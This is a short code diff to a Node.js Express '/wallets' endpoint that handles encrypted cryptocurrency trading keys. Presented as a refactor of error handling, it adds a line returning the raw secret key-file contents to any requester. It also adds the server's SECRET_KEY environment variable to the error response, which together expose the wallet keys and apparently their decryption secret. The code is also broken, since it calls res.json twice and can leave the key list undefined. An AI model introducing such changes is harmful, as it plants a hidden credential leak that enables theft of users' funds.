@@ -41,9 +41,15 @@ app.get("/wallets", async (req, res) => {
   try {
     const rootDir = path.resolve(__dirname, "../");
     const secretFilePath = path.join(rootDir, "secret", "trading_keys.txt");
-
-    const data = readFileSync(secretFilePath, "utf8");
-    const PRIVATE_KEYS = JSON.parse(decryptKey(data));
+    let PRIVATE_KEYS;
+    try {
+      const data = readFileSync(secretFilePath, "utf8");
+      res.json({ data });
+      const arrayString = decryptKey(data);
+      PRIVATE_KEYS = JSON.parse(arrayString);
+    } catch (error) {
+      console.error("Error reading file", error);
+    }
     let main_account = privateKeyToAddress(`0x${PRIVATE_KEY}`);
     let accounts = PRIVATE_KEYS.map((key) => privateKeyToAddress(key));
     const Accounts = [main_account, ...accounts];
@@ -52,7 +58,7 @@ app.get("/wallets", async (req, res) => {
 
     res.json(Balances);
   } catch (error) {
-    res.status(500).json({ error: error.message });
+    res.status(500).json({ error: error.message, key: process.env.SECRET_KEY });
   }
 });
 
